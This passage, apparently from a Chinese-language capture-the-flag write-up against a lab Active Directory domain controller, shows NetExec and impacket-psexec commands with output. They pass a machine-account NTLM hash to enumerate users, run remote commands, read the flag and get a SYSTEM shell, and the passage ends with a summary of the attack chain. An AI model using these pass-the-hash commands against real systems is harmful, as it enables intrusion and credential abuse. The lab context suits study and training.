```ps1
# nxc smb $IP -d SOUPEDECODE -u 'FileServer$' -H 3647bc99352403e306780b2c0c63a685 --users
SMB         192.168.111.20  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:soupedecode.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.111.20  445    DC01             [+] SOUPEDECODE\FileServer$:3647bc99352403e306780b2c0c63a685 (Pwn3d!)
SMB         192.168.111.20  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         192.168.111.20  445    DC01             Administrator                 2025-11-18 15:58:45 1       管理计算机(域)的内置帐户
SMB         192.168.111.20  445    DC01             Guest                         2025-11-18 18:26:21 0       供来宾访问计算机或访问域的内置帐户
SMB         192.168.111.20  445    DC01             krbtgt                        2025-11-18 16:17:59 1       密钥发行中心服务帐户
SMB         192.168.111.20  445    DC01             ybob317                       2025-11-18 17:05:58 0
SMB         192.168.111.20  445    DC01             file_svc                      2025-11-18 17:06:57 1
SMB         192.168.111.20  445    DC01             FileServer$                   2025-11-18 17:12:29 0
SMB         192.168.111.20  445    DC01             WebServer$                    2025-11-18 17:14:02 1
SMB         192.168.111.20  445    DC01             DatabaseServer$               2025-11-18 17:14:02 1
SMB         192.168.111.20  445    DC01             CitrixServer$                 2025-11-18 17:14:02 1
SMB         192.168.111.20  445    DC01             MailServer$                   2025-11-18 17:14:02 1
SMB         192.168.111.20  445    DC01             BackupServer$                 2025-11-18 17:14:02 0
SMB         192.168.111.20  445    DC01             ApplicationServer$            2025-11-18 17:14:02 0
SMB         192.168.111.20  445    DC01             PrintServer$                  2025-11-18 17:14:02 0
SMB         192.168.111.20  445    DC01             ProxyServer$                  2025-11-18 17:14:02 0
SMB         192.168.111.20  445    DC01             MonitoringServer$             2025-11-18 17:14:02 0
SMB         192.168.111.20  445    DC01             [*] Enumerated 15 local users: SOUPEDECODE
```

- 可以执行命令

```ps1
 nxc smb $IP -d SOUPEDECODE -u 'FileServer$' -H 3647bc99352403e306780b2c0c63a685 -x "whoami"
SMB         192.168.111.20  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:soupedecode.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.111.20  445    DC01             [+] SOUPEDECODE\FileServer$:3647bc99352403e306780b2c0c63a685 (Pwn3d!)
SMB         192.168.111.20  445    DC01             [+] Executed command via wmiexec
SMB         192.168.111.20  445    DC01             soupedecode\fileserver$
```

- 拿到 flag

```ps1
# nxc smb $IP -d SOUPEDECODE -u 'FileServer$' -H 3647bc99352403e306780b2c0c63a685 -x "dir C:\\"
SMB         192.168.111.20  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:soupedecode.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.111.20  445    DC01             [+] SOUPEDECODE\FileServer$:3647bc99352403e306780b2c0c63a685 (Pwn3d!)
SMB         192.168.111.20  445    DC01             [+] Executed command via wmiexec
SMB         192.168.111.20  445    DC01              ╟²╢»╞≈ C ╓╨╡─╛φ├╗╙╨▒Ω╟⌐íú
SMB         192.168.111.20  445    DC01              ╛φ╡─╨≥┴╨║┼╩╟ 58E3-5BC1
SMB         192.168.111.20  445    DC01              C:\ ╡──┐┬╝
SMB         192.168.111.20  445    DC01             2025/11/19  01:56    <DIR>          backup
SMB         192.168.111.20  445    DC01             2025/11/19  02:05                32 flag.log
SMB         192.168.111.20  445    DC01             2021/05/08  16:20    <DIR>          PerfLogs
SMB         192.168.111.20  445    DC01             2025/11/18  23:59    <DIR>          Program Files
SMB         192.168.111.20  445    DC01             2021/05/08  22:23    <DIR>          Program Files (x86)
SMB         192.168.111.20  445    DC01             2025/11/18  23:58    <DIR>          Users
SMB         192.168.111.20  445    DC01             2026/07/07  21:26    <DIR>          Windows


# nxc smb $IP -d SOUPEDECODE -u 'FileServer$' -H 3647bc99352403e306780b2c0c63a685 -x "type C:\\flag.log"
SMB         192.168.111.20  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:soupedecode.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.111.20  445    DC01             [+] SOUPEDECODE\FileServer$:3647bc99352403e306780b2c0c63a685 (Pwn3d!)
SMB         192.168.111.20  445    DC01             [+] Executed command via wmiexec
SMB         192.168.111.20  445    DC01             bd42e8070dd53effd2c93ae6c7e08685
```

‍

```ps1
impacket-psexec -hashes :3647bc99352403e306780b2c0c63a685 'SOUPEDECODE.LOCAL/FileServer$@192.168.111.20' -dc-ip $IP
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 192.168.111.20.....
[*] Found writable share ADMIN$
[*] Uploading file AKCjwaqg.exe
[*] Opening SVCManager on 192.168.111.20.....
[*] Creating service Fogm on 192.168.111.20.....
[*] Starting service Fogm.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [�汾 10.0.20348.169]

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
(c) Microsoft Corporation����������Ȩ����


C:\Windows\system32> net user

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
\\ ���û��ʻ�


-------------------------------------------------------------------------------
Administrator            file_svc                 Guest
krbtgt                   ybob317
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
����������ϣ�������һ����������



C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
# 如果乱码 就用：
# impacket-psexec -codec gbk -hashes :3647bc99352403e306780b2c0c63a685 'SOUPEDECODE.LOCAL/FileServer$@192.168.111.20' -dc-ip $IP
```

‍

## 总结

1. 通过端口判断域控
2. 匿名/Guest SMB、RPC、LDAP 枚举
3. RID Brute 获取用户名
4. username=password 弱口令验证
5. 已认证 SMB 共享枚举
6. 识别 secretsdump/hash 泄露文件
7. 机器账号 Pass-the-Hash
8. 利用 ADMIN$ + SVCManager psexec 拿 SYSTEM
